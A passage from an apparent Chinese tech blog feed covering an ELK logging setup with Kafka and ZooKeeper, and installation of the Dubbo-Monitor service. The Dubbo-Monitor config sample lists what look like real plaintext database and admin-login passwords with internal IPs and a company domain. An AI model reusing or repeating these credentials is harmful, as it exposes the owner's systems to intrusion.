environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[zk: localhost:2181(CONNECTED) 0] ls /&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[0, 1, 2]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;kafka 三台集群这里可以看到获取到ids。&lt;/p&gt;
&lt;h4 id=&quot;安全问题&quot;&gt;&lt;a href=&quot;#安全问题&quot; class=&quot;headerlink&quot; title=&quot;安全问题&quot;&gt;&lt;/a&gt;安全问题&lt;/h4&gt;&lt;p&gt;特别要注意elk所有软件的端口监听,切勿暴露监听到公网上去,另外即便是内网你也得注意配置内网的访问限制。&lt;/p&gt;
&lt;h3 id=&quot;logstash-客户端安装：&quot;&gt;&lt;a href=&quot;#logstash-客户端安装：&quot; class=&quot;headerlink&quot; title=&quot;logstash 客户端安装：&quot;&gt;&lt;/a&gt;logstash 客户端安装：&lt;/h3&gt;&lt;h5 id=&quot;源码安装&quot;&gt;&lt;a href=&quot;#源码安装&quot; class=&quot;headerlink&quot; title=&quot;源码安装&quot;&gt;&lt;/a&gt;源码安装&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;我这里源码包安装&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# wget https://download.elasticsearch.org/logstash/logstash/logstash-2.4.0.tar.gz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#curl -O https://download.elastic.co/logstash/logstash/logstash-2.4.0.tar.gz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#tar -zxvf logstash-2.4.0.tar.gz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#mv logstash-2.4.0 /usr/local/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ln -s /usr/local/logstash-2.4.0/ /usr/local/logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;下载启动脚本&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;生产都是运行在后台的，我这里源码安装没有init脚本启动。 去Github下载  https://github.com/benet1006/ELK_config.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#cp logstash.init /etc/init.d/logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#chmod +x /etc/init.d/logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这个脚本我做过修改。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#启动logstash服务&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service logstash start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service logstash status&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#查看5000端口&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;netstat -nltp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Active Internet connections (only servers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/node&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 :::22 :::* LISTEN 1509/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;修改启动脚本&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vim /etc/init.d/logstash &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;指定的目录自己源码安装的路径。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name=logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pidfile=&lt;span class=&quot;string&quot;&gt;&quot;/var/run/&lt;span class=&quot;variable&quot;&gt;$name&lt;/span&gt;.pid&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CLASSPATH=.:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/jre/lib/rt.jar:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/lib/dt.jar:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/lib/tools.jar&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/bin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_USER=logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_GROUP=logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_HOME=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/logstash 安装路径&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_HEAP_SIZE=&lt;span class=&quot;string&quot;&gt;&quot;1000m&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_JAVA_OPTS=&lt;span class=&quot;string&quot;&gt;&quot;-Djava.io.tmpdir=&lt;span class=&quot;variable&quot;&gt;$&amp;#123;LS_HOME&amp;#125;&lt;/span&gt;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_LOG_DIR=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_LOG_FILE=&lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;LS_LOG_DIR&amp;#125;&lt;/span&gt;/&lt;span class=&quot;variable&quot;&gt;$name&lt;/span&gt;.log&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_CONF_FILE=/etc/logstash.conf     收集日志的规则conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_OPEN_FILES=16384&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_NICE=19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_OPTS=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这个是&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; stash的官方文档的配置说明。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这个配置说明上面我先修改下我之前的配置文件。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;logstash-agent配置：&quot;&gt;&lt;a href=&quot;#logstash-agent配置：&quot; class=&quot;headerlink&quot; title=&quot;logstash agent配置：&quot;&gt;&lt;/a&gt;logstash agent配置：&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;配置&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; stash－实现系统日志收集input&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file_to_kafka.conf 日志文件读出写入到kafka&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;input &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;/srv/tomcat/logs/account/logFile.*.log&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;tomcat&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discover_interval =&amp;gt; 15 &lt;span class=&quot;comment&quot;&gt;#logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;output &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#stdout &amp;#123; codec =&amp;gt; rubydebug &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kafka&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;bootstrap_servers =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.46.72.172:9092,10.47.88.103:9092,10.47.102.137:9092&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#group_id =&amp;gt; &quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;topic_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.2 logstash indexer 配置&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kafka_to_es.conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;input &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kafka &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;zk_connect =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181kafka&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;group_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;topic_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;reset_beginning =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)， default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;consumer_threads =&amp;gt; 2 &lt;span class=&quot;comment&quot;&gt;# number (optional)， default: 1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;decorate_events =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)， default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;output &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hosts =&amp;gt; [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9200&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9200&quot;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;index =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;%&amp;#123;host&amp;#125;-%&amp;#123;+YYYY.MM.dd&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# stdout &amp;#123; codec =&amp;gt; rubydebug &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;es安装插件head查看下效果：&quot;&gt;&lt;a href=&quot;#es安装插件head查看下效果：&quot; class=&quot;headerlink&quot; title=&quot;es安装插件head查看下效果：&quot;&gt;&lt;/a&gt;es安装插件head查看下效果：&lt;/h4&gt;&lt;p&gt;然后打开网站：&lt;a href=&quot;http://elk.ihaozhuo.com/_plugin/head/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://elk.ihaozhuo.com/_plugin/head/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/es_head.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;####kibana网站效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/es_kibana.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;搭建-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafka为消息中心的ELK日志平台&quot;&gt;&lt;a href=&quot;#搭建-ElasticSearch-2-x-Logstash-2-x-Kibana
    
    </summary>
    
      <category term="日志分析平台" scheme="http://blog.yangcvo.me/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    
      <category term="Log analysis platform" scheme="http://blog.yangcvo.me/tags/Log-analysis-platform/"/>
    
  </entry>
  
  <entry>
    <title>Dubbo监控Dubbo-Monitor的安装配置使用</title>
    <link href="http://blog.yangcvo.me/2016/12/21/Java-Dubbo/Dubbo%E7%9B%91%E6%8E%A7Dubbo-Monitor%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8/"/>
    <id>http://blog.yangcvo.me/2016/12/21/Java-Dubbo/Dubbo监控Dubbo-Monitor的安装配置使用/</id>
    <published>2016-12-21T09:44:04.000Z</published>
    <updated>2017-04-26T02:33:11.000Z</updated>
    
    <content type="html">&lt;p&gt;前面我安装了Dubbo监控管控台dubbo-admin的安装配置可以到我dubbo书签🔖查看。&lt;/p&gt;
&lt;h3 id=&quot;Dubbo-Monitor-详细介绍&quot;&gt;&lt;a href=&quot;#Dubbo-Monitor-详细介绍&quot; class=&quot;headerlink&quot; title=&quot;Dubbo Monitor 详细介绍&quot;&gt;&lt;/a&gt;Dubbo Monitor 详细介绍&lt;/h3&gt;&lt;p&gt;Dubbo Monitor是针对Dubbo开发的监控系统，参考&lt;code&gt;dubbo-monitor-simple&lt;/code&gt;改进而成，可以理解为其演化版本。该系统MySQL或者Mongodb记录日志的方式替代了&lt;code&gt;dubbo-monitor-simple&lt;/code&gt;写文件的方式。&lt;/p&gt;
&lt;p&gt;PS: 项目目前依赖的是dubbox的2.8.4版本，但是dubbox并没有修改过监控相关的代码，因此理论上也可以支持dubbo的最新版本。&lt;/p&gt;
&lt;p&gt;master分支：MySQL&lt;/p&gt;
&lt;p&gt;mongodb分支：mongodb&lt;/p&gt;
&lt;p&gt;Dubbo-monitor 码云上面有共享源代码：&lt;a href=&quot;http://git.oschina.net/handu/dubbo-monitor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;基于Dubbox最新版本重新开发的简单监控&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Dubbo-Monitor配置介绍&quot;&gt;&lt;a href=&quot;#Dubbo-Monitor配置介绍&quot; class=&quot;headerlink&quot; title=&quot;Dubbo-Monitor配置介绍&quot;&gt;&lt;/a&gt;Dubbo-Monitor配置介绍&lt;/h3&gt;&lt;p&gt;下载监控代码： &lt;code&gt;git clone https://git.oschina.net/handu/dubbo-monitor.git&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一步&lt;/code&gt;：创建数据库&lt;br&gt;首先创建名称为monitor数据库，编码格式UTF-8。然后将项目sql文件夹下面的create.sql导入到数据库，生成dubbo_invoke表代表成功导入。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第二步&lt;/code&gt;：编辑项目中application.properties，配置如下：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### Dubbo Settings&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.application.name=dubbo-monitor&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.application.owner=ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.registry.address=zookeeper://10.28.32.30:2181?backup=10.47.100.23:2181,10.27.23.75:2181 &lt;span class=&quot;comment&quot;&gt;##这里我是zk多台集群。一台直接在2181后面结尾就行。&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.protocol.port=6060&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### Database Settings&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.url=jdbc:mysql://&amp;lt;database_host&amp;gt;:&amp;lt;database_port&amp;gt;/monitor?prepStmtCacheSize=517&amp;amp;cachePrepStmts=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;amp;autoReconnect=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;amp;characterEncoding=utf-8    &lt;span class=&quot;comment&quot;&gt;###这里说明下&amp;lt;database_host&amp;gt;是数据库地址  &amp;lt;database_port&amp;gt; 数据库端口  monitor 数据库&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.username=yjk_user   数据库用户名&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.password=wrefdsf3426 数据库密码&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.maxActive=500  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### System Manager&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;manager.username=ihaozhuo    这个是登录监控的时候用户名和密码&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;manager.password=haozhuo2015&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;第三步&lt;/code&gt;：打包运行项目&lt;br&gt;执行maven命令：&lt;code&gt;mvn clean package&lt;/code&gt;&lt;br&gt;target文件夹下生成的&lt;code&gt;dubbo-monitor.war&lt;/code&gt;即为项目部署文件，将其放置到对应服务器目录下，启动服务器即可。例如：&lt;code&gt;tomcat的webapps&lt;/code&gt;文件夹下。&lt;/p&gt;
&lt;p&gt;第四步：访问项目&lt;br&gt;启动web服务器后，访问地址：&lt;code&gt;http://IP:[port]/moniotor&lt;/code&gt;，采用配置文件中manager.username和&lt;code&gt;manager.password&lt;/code&gt;设置值进行登录。&lt;/p&gt;
